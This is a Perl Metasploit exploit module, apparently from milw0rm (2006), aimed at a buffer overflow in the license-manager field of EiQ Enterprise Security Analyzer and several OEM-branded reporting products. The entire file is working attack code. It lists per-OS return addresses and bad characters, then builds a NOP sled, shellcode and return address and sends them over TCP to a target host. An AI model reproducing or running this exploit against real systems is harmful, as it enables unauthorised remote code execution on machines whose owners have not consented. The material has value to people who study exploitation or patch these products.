#!/usr/bin/perl -w

package Msf::Exploit::EiQ_License; 
use base "Msf::Exploit";
use strict;
use Pex::Text;

my $advanced = { };

my $info =
  {
	'Name'     => 'EIQ License Manager Overflow',
	'Authors'  => [ 'ri0t ri0t@ri0tnet.net KF kf_list@digitalmunition.com' ],

	'Arch'  => [ 'x86' ],
	'OS'    => [ 'win32', 'win2000', 'winxp' ],
	'Priv'  => 0,
	
	'AutoOpts'  => { 'EXITFUNC' => 'seh' },
	
	'UserOpts'  =>
	  {
		'RHOST' => [1, 'ADDR', 'The target address'],
		'RPORT' => [1, 'PORT', 'The target port', 10616],
	 },
        'Payload'  =>
	  {
		'Space' => 494,
		'BadChars'  => "\x00\x0a\x0d\x40\x26",
            },
          'Description'  =>  Pex::Text::Freeform(qq{
        This module Exploits a buffer overflow in the LICENCE_MANAGER field of
	EiQ networks Enterprise Security Analyzer.  This bug was found by Titon
	of Bastard Labs. 
        }),
        

	'Refs' =>
	[
		['OSVDB', '27526'],
	],
          
        'DefaultTarget' => 1,
	'Targets' =>
	  [
		['EiQ Enterprise Security Analyzer Buffer size 494 Windows 2000 SP0-SP4 English', 0x750316e2, 494 ],   # call ebx
		['EiQ Enterprise Security Analyzer Buffer size 494 Windows XP English SP1/SP2', 0x77db64dc, 494 ],	# jmp ebx
		['EiQ Enterprise Security Analyzer Buffer size 494 Windwos Server 2003 SP0/SP1', 0x77d16764, 494 ],   # jmp EBX
		['Astaro Report Manager (OEM) Buffer size 1262 Windows 2000 SP0-SP4 English', 0x750316e2, 1262 ],
		['Astaro Report Manager (OEM) Buffer size 1262 Windows XP English SP1/SP2', 0x77db64dc, 1262 ],
		['Astaro Report Manager (OEM) Buffer size 1262 Windows Server 2003 English SP0/SP1', 0x77d16764, 1262 ],
		['Fortinet FortiReporter (OEM) Buffer size 1262 Windows 2000 SP0-SP4 English', 0x750316e2, 1262 ],
	        ['Fortinet FortiReporter (OEM) Buffer size 1262 Windows XP English SP1/SP2', 0x77db64dc, 1262 ],
	        ['Fortinet FortiReporter (OEM) Buffer size 1262 Windows Server 2003 English SP0/SP1', 0x77d16764, 1262 ],
		['iPolicy Security Reporter (OEM) Buffer size 1262 Windows 2000 SP0-SP4 English', 0x750316e2, 1262 ],
                ['iPolicy Security Reporter (OEM) Buffer size 1262 Windows XP English SP1/SP2', 0x77db64dc, 1262 ],
		['iPolicy Security Reporter (OEM) Buffer size 1262 Windows Server 2003 English SP0/SP1', 0x77d16764, 1262 ],
		['SanMina Viking Multi-Log Manager (OEM) Buffer size 1262 Windows 2000 SP0-SP4 English', 0x750316e2, 1262 ],
                ['SanMina Viking Multi-Log Manager (OEM) Buffer size 1262 Windows XP English SP1/SP2', 0x77db64dc, 1262 ],
		['SanMina Viking Multi-Log Manager (OEM) Buffer size 1262 Windows Server 2003 English SP0/SP1', 0x77d16764, 1262 ],
		['Secure Computing G2 Security Reporter (OEM) Buffer size 1262 Windows 2000 SP0-SP4 English', 0x750316e2, 1262 ],
                ['Secure Computing G2 Security Reporter (OEM) Buffer size 1262 Windows XP English SP1/SP2', 0x77db64dc, 1262 ],
	        ['Secure Computing G2 Security Reporter (OEM) Buffer size 1262 Windows Server 2003 English SP0/SP1', 0x77d16764, 1262 ],
		['Top Layer Network Security Analyzer (OEM) Buffer size 1262 Windows 2000 SP0-SP4 English', 0x750316e2, 1262 ],
                ['Top Layer Network Security Analyzer (OEM) Buffer size 1262 Windows XP English SP1/SP2', 0x77db64dc, 1262 ],
	        ['Top Layer Network Security Analyzer (OEM) Buffer size 1262 Windows Server 2003 English SP0/SP1', 0x77d16764, 1262 ],
         ], 
  };
  
  sub new {
	my $class = shift;
	my $self = $class->SUPER::new({'Info' => $info, 'Advanced' => $advanced}, @_);
	return($self);
}
  
  sub Exploit {
	my $self = shift;
	my $target_host = $self->GetVar('RHOST');
	my $target_port = $self->GetVar('RPORT');
	my $target_idx  = $self->GetVar('TARGET');
	my $shellcode   = $self->GetVar('EncodedPayload')->Payload;
	my $target      = $self->Targets->[$target_idx];
	my $nopsize = $target->[2];
        my $nops 	= $self->MakeNops($nopsize - length($shellcode));
        my $ret         =  pack("V", $target->[1]);
        my $evil        = "LICMGR_ADDLICENSE&" . $nops . $shellcode . $ret . "&";
	
            
        my $s = Msf::Socket::Tcp->new
	  (
		'PeerAddr'  => $target_host,
		'PeerPort'  => $target_port,
		'LocalPort' => $self->GetVar('CPORT'),
    	  );
          
          if ($s->IsError) {
		$self->PrintLine('[*] Error creating socket: ' . $s->GetError);
		return;
	}
          $self->PrintLine(sprintf ("[*] Trying ".$target->[0]." using return address 0x%.8x....", $target->[1]));
          
          $s->Send("$evil");
          return;
  }

# milw0rm.com [2006-08-07]
